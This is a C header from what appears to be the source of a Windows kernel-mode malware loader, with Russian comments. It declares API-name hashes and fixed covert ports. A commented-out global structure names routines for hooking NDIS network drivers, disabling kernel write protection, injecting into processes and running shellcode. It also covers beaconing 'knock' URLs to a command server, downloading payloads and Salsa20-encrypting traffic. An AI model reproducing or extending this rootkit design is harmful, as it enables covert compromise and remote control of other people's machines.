#ifndef __COMMON_H_
#define __COMMON_H_

#include "ctrldefs.h"

#define MAX_BUNDLEID_LENGTH 50
#define MAX_ETH_PACKET_SIZE 2000
#define WAIT_INFINITE 0

#define MAX_PATH 260

#define TCP_LOCAL_PORT    31798
#define UDP_LOCAL_PORT    31897

#define EXPLORER_EXE 0x9b7afd26            // explorer.exe
#define SETEVENT_HASH 0x54aa7cc8        // SetEvent

typedef struct _ADAPTER ADAPTER, *PADAPTER;
typedef struct _HOOK_CONTEXT HOOK_CONTEXT, *PHOOK_CONTEXT;

#include "ndis_zombi.h"
#include "hookengine.h"
#include "adapter.h"
#include "ndishook.h"
#include "tasks.h"
#include "..\..\mod_shared\pe.h"
#include "diskio.h"

// Идентификаторы параметров
// #define PARAM_KNOCK_URL1            1
// #define PARAM_KNOCK_URL2            2
// #define PARAM_KNOCK_URL3            3
// #define PARAM_KNOCK_COUNT            4
// #define PARAM_KNOCK_TIMEOUT            5
// #define PARAM_RESOLVE_PER_KNOCKS    6
// #define PARAM_HTTP_USER_AGENT        7


typedef enum _LOADER_OS_VERSION {
    Win_Unknown = 0,
    Win_XP,
    Win_2003,
    Win_Vista,
    Win_2008,
    Win_7,
    Win_2008_R2,
} LOADER_OS_VERSION;

// Определение типов и констант для получения системно-зависимой информации
typedef struct _SYS_SPECIFIC_INFO
{
    UINT32 osInfo;
// #ifndef _AMD64_
//     UINT32 cpuid;    
// #endif
    UINT32 dwPID;
    UINT32 dwPeb;
    UINT32 dwLdr;
    UINT32 dwInMemoryOrderModuleList;
    UINT32 dwDllBase;
    UINT32 dwFullDllName;
//    UINT32 dwApcState;
//    UINT32 dwApcQueueable;
//    UINT32 dwAlertable;
    
} SYSTEM_SPECIFIC_INFO;

#define EPROCESS_NAME_SIZE 0x010    // 16 байтов

typedef struct queue* sys_mbox_t;


typedef struct _ZW_MODULE_INFO
{
    PUCHAR pBase;
    UINT32 size;
} ZW_MODULE_INFO;


#if DBG

typedef WP_GLOBALS (*FnUtilsDisableWP_MDL)(void* ptr, ULONG size);
typedef void (*FnUtilsEnableWP_MDL)(PMDL pMDL, void* ptr);

#endif

//#pragma pack(push, 1)
// 
// typedef struct _GLOBAL_DATA
// {
//     KERNEL_FUNCTIONS;
//     NETWORK_PUBLIC_FUNCTIONS;
//     
//     NETWORK_INTERNAL_FUNCTIONS;
//     NETWORK_INTERNAL_DATA;
// 
// //#ifndef _AMD64_
//     PSDE pKeServiceDescriptorTable;
// //#endif
//     PUCHAR pKiServiceTable;
// 
//     // NDIS!
//     FnNdisAllocateMemoryWithTag fnNdisAllocateMemoryWithTag;
//     FnNdisFreeMemory fnNdisFreeMemory;
//     FnNdisGetPoolFromPacket fnNdisGetPoolFromPacket;
//     FnNdisUnchainBufferAtFront fnNdisUnchainBufferAtFront;
//     FnNdisFreePacket fnNdisFreePacket;
//     FnNdisDprFreePacket fnNdisDprFreePacket;
//     FnNdisAllocatePacket fnNdisAllocatePacket;
//     FnNdisFreeBufferPool fnNdisFreeBufferPool;
//     FnNdisFreePacketPool fnNdisFreePacketPool;
//     FnNdisAllocatePacketPool fnNdisAllocatePacketPool;
//     FnNdisAllocateBufferPool fnNdisAllocateBufferPool;
//     FnNdisAllocateBuffer fnNdisAllocateBuffer;
//     FnNdisRequest fnNdisRequest;
// 
//     FnNdisReturnNetBufferLists fnNdisReturnNetBufferLists;
//     FnNdisAllocateMdl fnNdisAllocateMdl;
//     FnNdisAllocateNetBufferListPool fnNdisAllocateNetBufferListPool;
//     FnNdisFreeNetBufferListPool fnNdisFreeNetBufferListPool;
//     FnNdisAllocateNetBufferAndNetBufferList fnNdisAllocateNetBufferAndNetBufferList;
//     FnNdisFreeNetBufferList fnNdisFreeNetBufferList;
//     FnNdisGetPoolFromNetBufferList fnNdisGetPoolFromNetBufferList;
//     FnNdisFreeMdl fnNdisFreeMdl;
// 
//     FnNdisMiniportSendPackets fnNdisMiniportSendPackets;
//     FnMiniportReturnPacket fnMiniportReturnPacket;
//     FnNdisMiniportSendNetBufferLists fnNdisMiniportSendNetBufferLists;
// 
//     HookInternalReceiveHandler fnHookInternalReceiveHandler;
// 
// #if _AMD64_
//     Fnhde64_disasm fnhde64_disasm;
// #else
//     Fnhde32_disasm fnhde32_disasm;
// #endif
//     Fnhde_disasm fnhde_disasm;
// 
//     // Все функции драйвера
//     FnFindModuleBaseFromIDT fnFindModuleBaseFromIDT;
//     FnPEFindExportByHash fnPEFindExportByHash;
//     FnUtilsDisableWP fnUtilsDisableWP;
//     FnUtilsEnableWP fnUtilsEnableWP;
//     FnUtilsParseURI fnUtilsParseURI;
//     FnFnRtlStringCchLengthA fnFnRtlStringCchLengthA;
//     FnFnRtlStringCchCatA fnFnRtlStringCchCatA;
//     FnFnRtlStringCchPrintfA fnFnRtlStringCchPrintfA;
//     FnUtilsFindThread fnUtilsFindThread;
//     FnUtilsAnsiToInt fnUtilsAnsiToInt;
//     FnUtilsAnsiToUInt32 fnUtilsAnsiToUInt32;
//     FnUtilsCalcHash fnUtilsCalcHash;
//     FnUtilsFindModuleBaseByDriverName fnUtilsFindModuleBaseByDriverName;
// 
// //    FnUtilsGetApiFuncVA fnUtilsGetApiFuncVA;
// //    FnUtilsDisablePageNXBit fnUtilsDisablePageNXBit;
//     FnUtilsSaveFileToDisk fnUtilsSaveFileToDisk;
//     FnFnRtlStringCchCopyW fnFnRtlStringCchCopyW;
// 
//     FnBase64Encode fnBase64Encode;
//     FnBase64Decode fnBase64Decode;
// 
//     FnSalsa20KeySetup fnSalsa20KeySetup;
//     FnSalsa20Encrypt fnSalsa20Encrypt;
// 
//     FnLZODecompress fnLZODecompress;
//     
//     FnPECheck fnPECheck;
//     FnCsrShellcode fnCsrShellcode;
//     PUCHAR usermodeShellcode;
// 
// //    FnKdVersionBlockDpc fnKdVersionBlockDpc;
//     FnUtilsIsValidPointer fnUtilsIsValidPointer;
//     FnFnRtlStringCchLengthW fnFnRtlStringCchLengthW;
//     FnFnRtlStringLengthWorkerA fnFnRtlStringLengthWorkerA;
//     FnFnRtlStringValidateDestA fnFnRtlStringValidateDestA;
//     FnUtilsAllocateMemory fnUtilsAllocateMemory;
//     FnNetCfgConfigureNetwork fnNetCfgConfigureNetwork; // offset 0x1C0 - 112
//     FnHTTPLoaderChangeKnockURL fnHTTPLoaderChangeKnockURL;
//     FnSysInfoFillDynamic fnSysInfoFillDynamic;
//     
//     FnHTTPSendKnockWithType fnHTTPSendKnockWithType; // offset 0x1CC
//     FnHTTPTransact fnHTTPTransact; // offset 0x1D0 - 116
//     FnHTTPDownloadFile fnHTTPDownloadFile;
//     FnHTTPPrepareKnockParams fnHTTPPrepareKnockParams; // offset 0x1D8 - 118
//     FnHTTPParseHeader fnHTTPParseHeader;
// 
//     FnTasksReturnCompleted fnTasksReturnCompleted;
//     FnTasksReturnObtained fnTasksReturnObtained;
//     FnTasksDestroy fnTasksDestroy;
//     FnTasksProcess fnTasksProcess;
// 
//     FnValidatorCheckBodyFor fnValidatorCheckBodyFor;
// 
//     FnAdapterDestroy fnAdapterDestroy;
// //    FnHookAdapter fnHookAdapter;
//     FnUnhookAdapter fnUnhookAdapter;
//     FnHookNdisFunc fnHookNdisFunc; // offset 0x208 - 130
//     FnFnNdisQueryPacket fnFnNdisQueryPacket;
//     FnUtilsGetSystem fnUtilsGetSystem;
//     FnUtilsFindServiceTableEntry fnUtilsFindServiceTableEntry;
// 
//     FnLoader_Ndis5Send fnLoader_Ndis5Send;
//     FnLoader_Ndis6Send fnLoader_Ndis6Send;
// 
//     FnRegistryOpenKey fnRegistryOpenKey;
//     FnRegistryReadValue fnRegistryReadValue;
//     FnRegistryFindAdapterInfo fnRegistryFindAdapterInfo;
// 
// 
// //    FnInstallUserModeApc fnInstallUserModeApc;
// //    FnKernelRoutine fnKernelRoutine;
// 
//     FnInjectIntoExistingProcess fnInjectIntoExistingProcess;
// 
//     Fnmd5 fnmd5;
// 
//     FnLoader_InternalReceiveHandler fnLoader_InternalReceiveHandler;
//     FnNetCfgDynamicAdapterAddressDetector fnNetCfgDynamicAdapterAddressDetector;
// 
//     Fnmd5_process fnmd5_process;
//     Fnmd5_update fnmd5_update;
// 
// //    Fnplug_holes fnplug_holes;
// 
//     FnUtilsAtomicAdd16 fnUtilsAtomicAdd16;
//     FnUtilsAtomicGet fnUtilsAtomicGet;
//     FnUtilsAtomicSub16 fnUtilsAtomicSub16;
// 
//     
//     FnFnRtlStringCchCatW fnFnRtlStringCchCatW;
//     FnChangeByteOrder fnChangeByteOrder;
//     FnDiskIOGetDeviceObjectByLetter fnDiskIOGetDeviceObjectByLetter;
//     FnDiskIOIdentifyDevice fnDiskIOIdentifyDevice;
//     FnUtilsFindBaseByInnerPtr fnUtilsFindBaseByInnerPtr;
//     FnHEHookFunction fnHEHookFunction;
//     FnHEUnhookFunction fnHEUnhookFunction;
//     FnMPHandleInterrupt_Hook5X fnMPHandleInterrupt_Hook5X;
//     FnMPHandleInterrupt_Hook6X fnMPHandleInterrupt_Hook6X;
//     FnHELockRoutine fnHELockRoutine;
//     FnUtilsGetCurrentProcessor fnUtilsGetCurrentProcessor;
// 
//     // NDIS hooks
//     FnHookNdis5_EthRxIndicateHandler fnHookNdis5_EthRxIndicateHandler;
//     FnHookNdis5_PacketIndicateHandler fnHookNdis5_PacketIndicateHandler;
//     FnHookNdis5_HaltHandler fnHookNdis5_HaltHandler;
//     FnHookNdis5_SendCompleteHandler fnHookNdis5_SendCompleteHandler;
//     FnHookNdis5_OpenSendCompleteHandler fnHookNdis5_OpenSendCompleteHandler;
//     FnHookNdis6_ReceiveHandler fnHookNdis6_ReceiveHandler;
//     FnHookNdis6_HaltHandler fnHookNdis6_HaltHandler;
//     FnHookNdis6_PauseHandler fnHookNdis6_PauseHandler;
//     FnHookNdis6_RestartHandler fnHookNdis6_RestartHandler;
//     FnHookNdis6_MSendNetBufferListsComplete fnHookNdis6_MSendNetBufferListsComplete;
// 
//     PUCHAR pTrampoline;
// 
//     ZW_MODULE_INFO ntkernelModule;
//     ZW_MODULE_INFO halModule;
//     ZW_MODULE_INFO ndisModule;
// 
//     POBJECT_TYPE* pPsProcessType;
//     POBJECT_TYPE* pIoDeviceObjectType;
//     POBJECT_TYPE* pIoDriverObjectType;
//     SYSTEM_BASIC_INFORMATION sysInfo;
//     ULONG osMajorVersion;
//     ULONG osMinorVersion;
// 
//     uint8_t* hde_table;
// 
//     UINT32 csrShellcodeSize;
//     UINT32 shellcodeSize;
// 
//     // HOOK engine
// //    BARRIER_UNIT he_BarrierUnit;
// //    LOCAL_HOOK_INFO he_HookListHead;
// //    LOCAL_HOOK_INFO he_RemovalListHead;
//     ULONG he_TrampolineSize;
//     DWORD he_lockAcquired;
//     DWORD he_nCPUsLocked;
// //    ULONG he_SlotList[MAX_HOOK_COUNT];
// //    LONG he_UniqueIDCounter;
// 
// //    void* pKdVersionBlock0;
// //    struct _KDPC kvbDpc; // KdVersionBlock DPC
// //    void* pKPCR;
// //    void* pPsLoadedModuleList;
// //    HANDLE hEvent;
// 
//     SYSTEM_SPECIFIC_INFO sysSpec;
//     KSPIN_LOCK spinLock;
//     // Некоторые параметры системы передаваемые на сервер
//     UINT16 osVer;
//     UINT16 osLang;
// 
//     // структура NETWORK_INFO
//     void** pNdisMiniports;            // Адрес внутри ndis.sys на список структур NDIS_MINIPORT_BLOCK
//     PADAPTER pHeadAdapter;            // Указатель на первый найденный адаптер в списке адаптеров.
//     PADAPTER pActiveAdapter;        // Текущий используемый адаптер для доступа к сети.
//     UINT32 sendFailed;
// //    LARGE_INTEGER lastReceiveTime;    // Время последнего входящего сетевого пакета.
//     BOOLEAN needReconfigure;        // Данный флаг указывает на то, что сеть должны быть реинициализированна.
//     int obtainedTasks;
//     UINT32 dataBufferSize;
//     UINT16 localPort;
//     UINT16 remotePort;
//     UINT32 remoteAddr;
//     // параметры которые могут менять во время работы лоадера
//     char* currKnockURL;
//     char* server;
//     char* domainPort;
//     char* url;
//     UINT16 port;
// 
//     PUNICODE_STRING netParams[4/*NUMBER_OF_PARAMS*/];
//     PUNICODE_STRING altNetParams[4/*NUMBER_OF_PARAMS*/];
//     PUNICODE_STRING deviceStr;
//     PUNICODE_STRING langKey;
//     PUNICODE_STRING langsKey;
//     PUNICODE_STRING ntCurrVerKey;
//     PUNICODE_STRING sysRootWord;
// 
//     PUCHAR pInPacketBuffer;
//     PLOADER_TASK pTaskHead;
//     struct netconn* pConnection;
//     PUCHAR pInDataBuffer;
//     PUCHAR pQueryBuffer;
//     PUCHAR pSystemRoot;
// 
//     // Salsa20
//     char sigma[16];           // {0x79,0x97,0x11,0x25,0x85,0x07,0x04,0x88,0x65,0x77,0x77,0x79,0x99,0xDE,0xFA,0x11};
// //    char tau[16];             // {0x0F,0x1E,0x2D,0x3C,0x4B,0x5A,0x69,0x78,0x21,0x34,0x55,0x89,0x79,0xAA,0xBB,0xCC};
// 
//     // md5
//     uint8_t* md5_padding[64];  // {
//                                     //  0x80, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
//                                     //  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
//                                     //  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
//                                     //  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 
//                                     // };
// 
//     // base64
//     char base64[65 + 7/*padding*/];          // "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
// 
//     char alphas[16];
// 
// //    PUINT8 pShellcode;
// 
//      char pageVal[8]; // "?page="
//      char pathBegin[8]; // "\??\C:\"
//     char dots[4]; // ..
//     char uModifier[4]; // %u
//     char cookie1[20 + 4/*padding*/]; // "Cookie: SESSION_ID=" 
//     char cookie2[20 + 4/*padding*/]; // "Cookie: SEQUENCE1="
//      char queryFmt[84 + 4/*padding*/]; // "GET %s HTTP/1.0\r\nHost: %s\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: %s\r\n%s\r\n"
//     char googleUrl[15 + 1/*padding*/];
//     WCHAR driverWord[8]; // "\Driver"
//     uint8_t currKnockCount;
//     char fileName[6];
// } GLOBAL_DATA, *PGLOBAL_DATA;

//#pragma pack(pop)

#endif // __COMMON_H_
